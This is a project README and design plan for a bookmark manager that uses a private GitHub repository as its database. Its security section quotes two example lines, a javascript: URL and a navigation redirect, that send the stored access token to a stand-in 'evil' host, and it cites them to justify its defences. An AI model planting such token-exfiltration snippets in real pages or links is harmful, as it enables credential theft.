# Bookmark Manager

A client-side SPA that uses a **private GitHub repository as its database**. No server, no
hosting bill, no vendor lock-in — your bookmarks are a versioned JSON file you own.

> This README is the **source of truth** for this project, per `AI_RULES_V1.13.md`.
> Every commit updates this file. Phases are numbered; sub-tasks are lettered; both carry
> checkmarks.

---

## 1. Architecture Overview

```
+---------------------------------------------------------------+
|                      Client Browser (SPA)                     |
|                                                               |
|   [ UI ] <--> [ Store ] <--> [ Sync Engine ] <--> [ API ]     |
|                   |               |                           |
|            [ IndexedDB ]    [ Outbox Queue ]                  |
|            (local mirror)   (durable, offline-safe)           |
+---------------------------------------------------------------+
                              |
              HTTPS · GitHub REST API · Fine-grained PAT
                              v
+---------------------------------------------------------------+
|                     GitHub Cloud Infrastructure               |
|                                                               |
|   [ Private Repo ] --> [ data/bookmarks.json ]                |
|          |                                                    |
|          +--> [ Actions: metadata enrichment, link checker ]  |
+---------------------------------------------------------------+
```

The **Sync Engine** is the heart of the system and the only genuinely hard component. It owns
conflict resolution, the write queue, rate-limit backoff, and offline durability. Everything
else is a thin shell around it.

---

## 2. Architectural Decisions

Decisions are recorded here rather than rediscovered. Items marked **OPEN** require sign-off
before the phase that depends on them begins.

| # | Decision | Choice | Rationale |
|---|----------|--------|-----------|
| D1 | Framework | **Svelte 5 + TypeScript + Vite** | Small bundle, no VDOM overhead on long lists, compiles away. |
| D2 | Styling | **Tailwind CSS** | Token-driven theming for dark / e-ink high-contrast modes. |
| D3 | Storage target | **Private repo only — no Gists** | Secret Gists are readable by anyone with the URL, and fine-grained PAT support for the Gists API is limited. |
| D4 | API layer | **Hand-rolled `fetch` wrapper** | `@octokit/rest` is heavy for the ~6 endpoints used, and we need custom retry/ETag logic anyway. |
| D5 | Write API | **Contents API in Phase 2, Git Data API from Phase 4** | Contents API is simpler to ship; Git Data API removes the 1 MB ceiling and enables multi-file atomic commits. |
| D6 | Conflict model | **Per-record last-write-wins with tombstones** | A true CRDT is overkill for single-user multi-device. Field-level merge may come later. |
| D7 | Local cache | **IndexedDB mirror + durable outbox** | Optimistic UI without durable queueing loses data on failed commits. |
| D8 | Token storage | **REOPENED — conditional on origin and install state** | A flat `sessionStorage` default is unusable on mobile: Android kills backgrounded PWAs and the token vanishes with the context. See the matrix in §5.5. |
| D9 | Hosting | **GitHub Pages via `actions/deploy-pages`** | Official path; the `gh-pages` branch pattern is deprecated. |
| D10 | Custom domain | **OPEN — now blocks D8** | Owning the origin is what makes persistent token storage safe (§5.1, §5.5). Without it, mobile users must choose between re-authenticating constantly and storing a token on a shared origin. |
| D11 | Encryption at rest | **OPEN — default NO** | Zero-knowledge encryption would kill readable diffs and rule out Actions-based enrichment (§9). |

---

## 3. Data Schema (`data/bookmarks.json`)

```json
{
  "schemaVersion": 2,
  "updatedAt": "2026-08-23T08:00:00Z",
  "tagMeta": {
    "tools": { "color": "#4f8", "order": 1 }
  },
  "bookmarks": [
    {
      "id": "01J8XQ2K7M3N4P5R6S7T8V9W0X",
      "url": "https://example.com/page?utm_source=x",
      "urlKey": "example.com/page",
      "title": "Example Resource",
      "description": "Short summary or context",
      "notes": "",
      "tags": ["tools", "dev/reference"],
      "favicon": null,
      "pinned": false,
      "archived": false,
      "createdAt": "2026-08-20T08:00:00Z",
      "updatedAt": "2026-08-23T08:00:00Z",
      "deletedAt": null,
      "enrichedAt": null
    }
  ]
}
```

### 3.1 Schema Rules

* **`schemaVersion` is an integer**, with an explicit migration ladder (`v1 -> v2 -> v3`).
  Every migration is a pure function, unit-tested, applied on load.
* **`updatedAt` is mandatory on every record.** Without it, merging is impossible.
* **`deletedAt` is a tombstone, not a removal.** Hard-deleting a record makes it reappear on
  the next sync from another device. Tombstones are pruned after 90 days.
* **`urlKey` is the normalized dedupe key** — lowercase host, `www.` stripped, tracking
  params (`utm_*`, `fbclid`, `gclid`, `ref`) removed, trailing slash dropped, fragment
  dropped unless it looks like a SPA route. Adding an existing `urlKey` updates in place
  rather than duplicating.
* **No top-level `tags` array.** The tag list is *derived* from bookmark membership at
  runtime. `tagMeta` holds presentation metadata only (colour, sort order) and may contain
  keys for tags with zero members.
* **One taxonomy, not two.** Folders are gone; hierarchy is expressed as `parent/child` tag
  paths. This removes the folder/tag ambiguity entirely.
* **IDs are ULIDs** — sortable by creation time, collision-safe, and unlike
  `crypto.randomUUID()` they carry no secure-context requirement.
* **Serialization is deterministic**: keys sorted, `bookmarks` sorted by `id`, two-space
  indent, trailing newline. The storage layer is git — readable diffs are free, and stable
  ordering sharply reduces merge conflicts.
* **Every load is validated** with a zod schema. A hand-edited or truncated file must
  surface a repairable error, never a white screen.

### 3.2 Merge Algorithm

```
merge(local, remote):
  1. Union both bookmark sets by `id`.
  2. For an id in both: keep the record with the greater `updatedAt`.
  3. On an exact `updatedAt` tie: the tombstone wins (delete beats edit).
  4. Union tagMeta; remote wins per-key on tie.
  5. Drop tombstones older than 90 days.
  6. Recompute top-level `updatedAt`.
```

Merge is a pure function over two JSON documents with no I/O. It is the highest-risk code in
the project and therefore the most heavily tested (see Phase 0d).

---

## 4. GitHub API Contract

### 4.1 Endpoints

| Operation | Endpoint | Notes |
|-----------|----------|-------|
| Probe / read | `GET /repos/{owner}/{repo}/contents/{path}` | Send `If-None-Match` with the cached ETag. A `304` costs no rate-limit quota. |
| Read (large) | `GET /repos/{owner}/{repo}/contents/{path}` with `Accept: application/vnd.github.raw` | Required above 1 MB — see §4.3. |
| Write | `PUT /repos/{owner}/{repo}/contents/{path}` | Requires `message`, `content` (base64), `sha`. |
| Write (Phase 4+) | Git Data API: blob -> tree -> commit -> ref | Removes size ceiling; enables atomic multi-file commits. |
| Change detection | `GET /repos/{owner}/{repo}/commits?path={path}&per_page=1` | Polled on window focus, ETag-conditional. |

### 4.2 Base64 Handling — Read This Before Writing Any Code

`btoa()` **throws on any character outside Latin-1**. A single emoji or accented character in
a page title breaks every write. Encoding must go through binary:

```ts
// encode: string -> base64
const bytes = new TextEncoder().encode(json);
const b64 = btoa(String.fromCharCode(...bytes));   // chunk for large inputs

// decode: base64 -> string
const bin = atob(b64.replace(/\n/g, ""));
const buf = Uint8Array.from(bin, c => c.charCodeAt(0));
const json = new TextDecoder().decode(buf);
```

The spread in `String.fromCharCode(...bytes)` blows the call stack on large arrays — chunk in
8 KB blocks. Both helpers are unit-tested against an emoji-and-CJK fixture in Phase 0d.

### 4.3 The 1 MB Ceiling

`GET .../contents/` stops populating the `content` field above **1 MB** and refuses files
above 100 MB entirely. At roughly 600 bytes per bookmark that is a hard wall at
**~1,500–2,000 bookmarks**. Mitigations, in order of application:

1. Read with `Accept: application/vnd.github.raw` (Phase 3).
2. Move writes to the Git Data API (Phase 4).
3. Shard into `data/bookmarks-{00..0f}.json` by `id` prefix if a single file becomes
   unwieldy (deferred; only if real usage demands it).

### 4.4 Rate Limits & The Write Queue

Authenticated PATs get 5,000 requests/hour, but the **secondary** limits are the real
constraint: GitHub expects content-modifying requests to be serialized, with roughly a second
between writes to the same repository. A commit per keystroke will get the client blocked.

The write queue therefore guarantees:

* **Single in-flight write.** Never concurrent, never parallel.
* **Debounced flush** — coalesce edits, flush after ~3 s idle or on page hide.
* **Exponential backoff** honouring `Retry-After` and `x-ratelimit-reset`.
* **Batched commits** — one commit may carry many logical edits, with a summarizing message
  (`"chore: sync 7 bookmark changes"`).

### 4.5 Error Taxonomy

| Status | Meaning | Handling |
|--------|---------|----------|
| `401` | Token invalid or expired | Re-auth modal; **preserve unsynced local edits**. |
| `404` | Repo missing **or** no permission | GitHub returns 404 rather than 403 to avoid leaking repo existence — the message must cover both causes. |
| `404` on path | First run, file absent | Bootstrap: create `data/bookmarks.json` with an empty document. |
| `409` | Stale `sha` | Refetch -> merge -> retry, max 3 attempts, then surface a conflict UI. |
| `403` + `x-ratelimit-remaining: 0` | Rate limited | Park the queue until `x-ratelimit-reset`; show a countdown. |
| `422` | Malformed payload | Log, do not retry, surface a bug report affordance. |
| Network failure | Offline | Queue persists in IndexedDB; retry on `online` event. |

---

## 5. Security Model

**Threat model in one line:** the page is public and that is fine — it ships no credentials.
The asset worth stealing is the user's PAT, which exists only in their own browser. Every rule
below protects that one secret, and the fine-grained token scope caps the damage if it leaks.

A stranger opening the app URL sees an empty first-run modal and nothing else. The realistic
compromise is **script execution on the app's own origin**, covered in §5.1 and §5.4.

### 5.1 The GitHub Pages Origin Problem

**`username.github.io` is a single origin shared by every project you host there.** Any other
page ever deployed under that account — an old demo, a half-finished experiment with an XSS
hole — can read this app's `localStorage` and obtain a token with write access to a private
repo.

Mitigations, best first:

1. **Serve from a custom domain** (decision D10) so the app owns its origin.
2. Use a **dedicated GitHub account** for hosting.
3. Default to **`sessionStorage`** (D8) so the token dies with the tab; `localStorage` is
   opt-in behind an explicit, plainly worded warning.

### 5.2 Hardening Rules

* **Strict CSP** shipped as a meta tag and verified in CI:
  `default-src 'self'; connect-src 'self' https://api.github.com; img-src 'self' data: https:;
  object-src 'none'; base-uri 'none'`.
* **Zero third-party scripts.** No analytics, no CDN fonts, no tag managers. Every one is a
  token-exfiltration surface.
* **Fine-grained PAT**, scoped to `Contents: Read & Write` on **one** repository. Nothing else.
* **Token expiry is a first-class UX state.** Fine-grained PATs expire; warn at 7 days
  remaining, and never lose local edits at the 401 boundary.
* The token is **never** written to a URL, a log line, or an error report.

### 5.3 Privacy Caveat — Git History Is Permanent

Deleting a bookmark removes it from the current file, **not from the repository's history**.
Every URL ever saved remains recoverable from the commit log. This is stated plainly in the
onboarding flow. Users needing true erasure must rewrite history or start a fresh repo.

Client-side AES-GCM encryption (D11) would solve this but forfeits readable diffs and
Actions-based enrichment. Default is **off**.

### 5.4 Untrusted Content Handling

Almost everything this app renders is attacker-influenceable: URLs and titles come from
`bookmarks.json`, from imported files (§11, 4b–4c), and from pages scraped by the enrichment
Action (§13, 6a). Any script execution on this origin reads the PAT out of storage, so these
rules are load-bearing, not hygiene.

* **URL scheme allowlist — `http:` and `https:` only.** Enforced twice: on save, and again at
  render time. A bookmark whose URL is `javascript:fetch('https://evil/?t='+sessionStorage.token)`
  executes in this origin the moment it is clicked. `data:`, `blob:`, `file:` and `vbscript:`
  are rejected the same way. Rejected URLs are shown as inert text with a warning badge, never
  as an anchor.
* **Never `{@html}`.** No value originating from the JSON file, an import, or the enrichment
  Action may be rendered as raw HTML. Svelte escapes by default; the risk is a single
  well-meaning exception. Enforced by an ESLint rule in CI, not by discipline.
* **Sanitize at the import boundary.** Bookmark HTML files are arbitrary attacker input. Parse
  with `DOMParser` into a detached document, read `textContent` only, strip control characters,
  and cap field lengths before anything reaches the store.
* **Treat the enrichment Action as untrusted output.** It scrapes `<title>` and meta tags from
  arbitrary third-party sites and commits the result into the repo. Strip control characters
  and cap lengths inside the Action, and validate again on load — the file is not trusted
  merely because it came from our own workflow.
* **Minimal dependency surface.** One compromised package with access to the page defeats every
  other control here. Few dependencies, committed lockfile, `npm ci` in CI, no post-install
  scripts, and no runtime CDN fetches.
* **Favicons are images, not trust.** Load them via `img-src`, never inline remote SVG — an
  inline SVG is a script execution vector.

**What CSP does and does not buy.** The policy in §5.2 blocks `fetch`/XHR to any host but
`api.github.com`, which is real defence in depth. It does **not** stop exfiltration by
navigation (`location = 'https://evil/?t=' + token`), and it cannot stop an attacker with
script execution from vandalising the repo through the endpoint we must allow. CSP raises the
cost of a compromise; the scheme allowlist and the escaping rules are what prevent one.

**Blast radius if the token leaks anyway:** contents of one private repository — read and
write. Not the account, not other repositories, not SSH keys, not Actions secrets. That
containment is the entire reason for the fine-grained scope in §5.2.

### 5.5 Token Storage — Conditional on Origin and Install State

`sessionStorage` was originally chosen as a flat default (D8). That is wrong on mobile.
**`sessionStorage` is scoped to a browsing context**, and Android kills backgrounded PWAs
routinely — so every cold launch of an installed app presents an empty store and demands the
PAT again. Nobody re-pastes a fine-grained token several times a week. In practice every
mobile user would take the `localStorage` opt-in, and "secure by default" would be theatre.

The safety of `localStorage` depends entirely on whether the app owns its origin (§5.1), so
the default is conditional rather than flat:

| Origin | Context | Default | Reasoning |
|--------|---------|---------|-----------|
| Custom domain (D10) | Installed PWA | `localStorage` | App owns the origin; no sibling pages exist to read it. Re-auth on every launch would be unusable. |
| Custom domain (D10) | Browser tab | `localStorage`, opt-out available | Same origin isolation; the tab is simply less persistent. |
| `*.github.io` | Installed PWA | `sessionStorage`, `localStorage` opt-in behind an explicit warning | Origin is shared with every other project on the account. The friction is the honest cost of that choice. |
| `*.github.io` | Browser tab | `sessionStorage` | Highest exposure, lowest need for persistence. |
| Shared or public device | Any | `sessionStorage`, forced | Offered as a "public computer" toggle in the first-run modal. |

This makes the custom-domain question (§16.1) materially more than a nicety: **it is what
decides whether the mobile experience can be both usable and safe.** Detection is
`window.matchMedia('(display-mode: standalone)')` plus an origin check, evaluated at startup
and surfaced in Settings so the user can see which mode they are in and why.

---

## 6. Background Execution & Platform Limits

The app **never runs continuously in the background**. Leaving it means Android (or any OS)
freezes the page and may kill it outright under memory pressure. The only thing that survives
is the service worker, which is event-driven: it wakes for a registered event, gets tens of
seconds of execution, and is killed again. There is no persistent process, and the design must
not assume one.

### 6.1 Wake Mechanisms

| Mechanism | Availability | Used for |
|-----------|--------------|----------|
| **Background Sync** (`sync`) | Chrome / Edge / Samsung on Android. Not Firefox, not iOS. | **Primary.** Flushes the outbox when connectivity returns, with the app closed. |
| **Periodic Background Sync** (`periodicsync`) | Chrome only, installed PWA only, interval chosen by the browser (~12 h in practice, tied to engagement score) | Not used. Too unreliable to build on; treat any firing as a bonus. |
| **Web Push** | Requires a push service and VAPID keys | **Rejected.** Technically deliverable from a GitHub Action, but it means storing push subscription endpoints in the repo. Not worth the complexity or the privacy cost. |
| **Web Share Target** | Chrome / Android, installed PWA | Launches the app in the foreground — not a background mechanism. |

### 6.2 The Case That Matters

A bookmark shared while offline — on a train, in a lift — sits in the local outbox with nothing
on GitHub yet. If the user then closes the app, the save must still complete.

* **Chrome on Android:** Background Sync fires on reconnect and the service worker commits it
  with the app closed. Invisible to the user.
* **Firefox on Android, and iOS:** no Background Sync. The outbox flushes on next app open.
  Later, never lossy.

Pulling *remote* changes in the background is deliberately **not** implemented. Sync-on-open
against a warm cache takes a few hundred milliseconds; background polling would burn battery
and rate limit for no perceptible gain.

### 6.3 Storage Eviction — The Real Risk

Android evicts IndexedDB under storage pressure, and the outbox lives in IndexedDB. Eviction
with unsynced bookmarks queued means **silent data loss**.

* Request `navigator.storage.persist()` at install time; Chrome generally grants it to
  installed PWAs.
* Surface the result in Settings. If persistence was **denied**, the app must say so plainly
  rather than quietly risking the queue.
* Warn in-app whenever the outbox is non-empty and persistence is unavailable.

### 6.4 Installation Is a Prerequisite, Not a Nicety

"Install" here is not an app-store download — there is no APK and nothing to publish. The
browser gives the existing page an app presence: launcher icon, standalone window, its own
entry in the app switcher. Same code, same origin, same storage. But three things depend on
it:

* **Web Share Target only exists for installed apps.** Android offers share targets from
  installed apps only, so 5b — the primary mobile capture path — does not function at all
  until the user installs. On mobile, install *is* the capture story.
* **Storage persistence is granted on install.** `navigator.storage.persist()` (§6.3) is
  heuristic and Chrome weights installation heavily. Installed generally succeeds; a plain tab
  generally does not. This is the difference between an outbox that survives storage pressure
  and one that is silently evicted.
* **Token persistence policy keys off it** (§5.5).

**Install paths differ sharply by platform:**

| Platform | Trigger | Notes |
|----------|---------|-------|
| Chrome — Android / desktop | `beforeinstallprompt` | Capture the event, `preventDefault()`, stash it, surface a custom Install button. One shot per session; a dismissal means no refire. |
| Safari — iOS | **None. Cannot be triggered programmatically.** | Detect iOS and render illustrated Share -> "Add to Home Screen" instructions. The result still has no Share Target and no Background Sync. |
| Firefox — Android | "Add to Home screen" | Installs, but gains neither Share Target nor Background Sync. |

The install prompt frequently becomes available *during* first-run setup, before the user has
any reason to want it. Stash the event and re-surface the offer once the first bookmark has
been saved, when the value is obvious.

---
## 7. Phase 0 — Foundations

* [ ] **0a.** Scaffold Svelte 5 + TypeScript + Vite + Tailwind; strict `tsconfig`.
* [ ] **0b.** Module layout: `src/lib/api/`, `src/lib/sync/`, `src/lib/schema/`,
  `src/lib/ui/`. No file exceeds 2,000 lines (per `AI_RULES_V1.13.md`).
* [ ] **0c.** Zod schema + migration ladder (`v1 -> v2`), with deterministic serializer.
* [ ] **0d.** Test harness (Vitest) + mocked GitHub API. Required coverage from day one:
  merge algorithm, base64 round-trip (emoji/CJK fixture), URL normalization, migrations.
* [ ] **0e.** CI workflow: typecheck, lint, test, build on every push.
* [ ] **0f.** Deploy workflow using `actions/upload-pages-artifact` + `actions/deploy-pages`;
  copy `index.html` to `404.html` so client-side routes survive a refresh.
* [ ] **0g.** CSP meta tag in the app shell, asserted by a CI check.
* [ ] **0h.** ESLint rule banning `{@html}`, plus a dependency policy — committed
  lockfile, `npm ci`, no post-install scripts, no runtime CDN fetches (§5.4).

## 8. Phase 1 — MVP: Connect, Read, Search

* [ ] **1a.** First-run modal: PAT + `owner/repo` + path, with a live connectivity probe.
* [ ] **1b.** Token store honouring D8 (`sessionStorage` default, `localStorage` opt-in).
* [ ] **1c.** Read path: fetch, decode, validate, migrate, hydrate store; cache the ETag.
* [ ] **1d.** Bootstrap flow — create `data/bookmarks.json` when the path 404s.
* [ ] **1e.** Bookmark list UI: title, host, description, tags, favicon placeholder.
* [ ] **1f.** Instant local search across title / URL / description / tags, debounced,
  ranked (title match beats description match).
* [ ] **1g.** Tag sidebar derived from bookmark membership; click to filter, multi-select.
* [ ] **1h.** Full error taxonomy (§4.5) surfaced as human-readable states.
* [ ] **1i.** Render-time URL scheme allowlist (`http:`/`https:`). Anything else renders
  as inert text with a warning badge, never as a clickable anchor (§5.4).

## 9. Phase 2 — Write Path

* [ ] **2a.** Quick-add modal — keyboard-driven, URL-first, tag autocomplete.
* [ ] **2b.** Edit and delete (delete writes a tombstone, never removes the record).
* [ ] **2c.** Write queue: single in-flight, 3 s debounce, batched commits.
* [ ] **2d.** Backoff honouring `Retry-After` / `x-ratelimit-reset`.
* [ ] **2e.** Optimistic UI with rollback on terminal failure.
* [ ] **2f.** Descriptive commit messages (`feat: add "Title"`, `chore: sync N changes`).
* [ ] **2g.** Dedupe on add via `urlKey` — offer "update existing" instead of duplicating.
* [ ] **2h.** Save-time URL validation and field-length caps, sharing one validator with
  1i so the two boundaries cannot drift apart (§5.4).

## 10. Phase 3 — Sync & Resilience

* [ ] **3a.** Merge algorithm (§3.2) wired into the 409 retry path.
* [ ] **3b.** IndexedDB mirror — app renders instantly from cache, syncs behind.
* [ ] **3c.** Durable outbox surviving reload, tab close, crash, and OS process kill.
* [ ] **3d.** Offline mode: full read/write locally, flush on reconnect.
* [ ] **3e.** Multi-tab safety via `navigator.locks` + `BroadcastChannel`.
* [ ] **3f.** Remote-change detection on window focus; "remote updated — refresh?" banner.
* [ ] **3g.** Raw media-type reads (`Accept: application/vnd.github.raw`) to clear 1 MB.
* [ ] **3h.** Tombstone pruning at 90 days.
* [ ] **3i.** Request `navigator.storage.persist()` at install; expose the grant/deny state
  in Settings and warn whenever the outbox is non-empty without persistence (§6.3).
* [ ] **3j.** Register a Background Sync (`sync`) handler in the service worker so a queued
  save completes with the app closed; fall back to flush-on-open where unsupported (§6.1).

## 11. Phase 4 — Scale & Portability

* [ ] **4a.** Migrate writes to the Git Data API (blob -> tree -> commit -> ref).
* [ ] **4b.** Import: Netscape bookmarks HTML (every browser exports this format).
* [ ] **4c.** Import: Raindrop / Pocket / Pinboard JSON + generic CSV.
* [ ] **4d.** Export: Netscape HTML and raw JSON. No lock-in, by design.
* [ ] **4e.** Bulk dedupe pass over `urlKey` with a review-before-apply UI.
* [ ] **4f.** Bulk tag operations — rename, merge, delete across the whole collection.
* [ ] **4g.** Import sanitisation: `DOMParser` into a detached document, `textContent`
  only, control characters stripped, lengths capped. Fixture-tested against a hostile
  bookmarks file containing `javascript:` URLs and HTML payloads in titles (§5.4).

## 12. Phase 5 — Capture Surfaces

* [ ] **5a.** PWA manifest + service worker; installable, offline-capable. Manifest needs
  `name`, `short_name`, `start_url`, `display: standalone`, and 192/512 icons including a
  maskable variant.
* [ ] **5b.** Web Share Target so Android "Share -> Bookmarks" works from any app.
* [ ] **5f.** Share-target field normalisation. Android apps are inconsistent about which
  field carries the URL — many use `text`, some pack title and URL together into `text`,
  fewer use `url`. Read all three (`url`, `text`, `title`) and extract the first valid URL
  from whichever is populated. A handler reading only `params.url` silently receives empty
  shares from a large share of apps.
* [ ] **5c.** iOS path — Share Sheet does not support Web Share Target; ship a Shortcut and
  a bookmarklet instead.
* [ ] **5d.** Desktop bookmarklet: one click captures the current tab's URL and title.
* [ ] **5e.** Verify the share -> offline -> app-closed path end to end on Chrome Android,
  and the flush-on-open fallback on Firefox Android (§6.2).
* [ ] **5g.** Install flow: capture and stash `beforeinstallprompt`, re-surface the offer
  after the first saved bookmark rather than during setup, and render illustrated
  "Add to Home Screen" instructions on iOS where no programmatic trigger exists (§6.4).
* [ ] **5h.** On successful install, request storage persistence (3i) and re-evaluate the
  token storage mode against the §5.5 matrix.

## 13. Phase 6 — Automation (GitHub Actions)

Browsers cannot fetch arbitrary pages for metadata — CORS blocks it. Enrichment therefore
runs server-side in the repo itself, which costs nothing and needs no infrastructure.

* [ ] **6a.** On-commit Action: fetch `<title>`, meta description, and favicon for records
  where `enrichedAt` is null; commit the enrichment back.
* [ ] **6b.** Loop guard — the enrichment commit must not retrigger the workflow.
* [ ] **6c.** Weekly scheduled link checker; flag dead links for review in-app.
* [ ] **6d.** Optional archival: submit new URLs to the Wayback Machine.
* [ ] **6e.** Sanitise scraped metadata inside the Action — strip control characters, cap
  lengths — and re-validate on load. Our own workflow's output is not trusted (§5.4).

## 14. Phase 7 — UX Polish

* [ ] **7a.** Command palette (`Cmd/Ctrl-K`) — add, search, filter, jump, all keyboard.
* [ ] **7b.** Theme system: light, dark, and **e-ink high-contrast** (no greys, no
  animation, maximum contrast).
* [ ] **7c.** Virtualized list so 10,000+ bookmarks stay smooth.
* [ ] **7d.** Accessibility: full keyboard navigation, focus management, ARIA, reduced-motion.
* [ ] **7e.** Onboarding that states the git-history privacy caveat (§5.3) plainly.
* [ ] **7f.** Settings: storage mode, sync interval, tombstone retention, theme.

---

## 15. Non-Goals

Recorded so scope stays honest:

* **No multi-user or sharing.** Single-user, multi-device is the target.
* **No full-text page archiving.** Bookmarks are pointers, not copies.
* **No browser extension** before Phase 7 — the bookmarklet and PWA cover capture.
* **No server component, ever.** If a feature needs one, it belongs in a GitHub Action.
* **No background polling and no push notifications.** The app syncs when opened and
  flushes queued writes on reconnect — nothing more (§6).

---

## 16. Open Questions

1. **Custom domain (D10)? — now the highest-priority question.** It gates D8: owning the
   origin is what allows a persistent token without the §5.1 shared-origin exposure, and
   therefore decides whether the installed mobile app can be both usable and safe (§5.5).
   Requires a domain you control.
2. **Encryption at rest (D11)?** Default is off. Turning it on forfeits readable diffs and
   all Phase 6 automation.
3. **Repo layout** — dedicated bookmarks repo, or `data/` inside an existing private repo?
   Assumed dedicated.
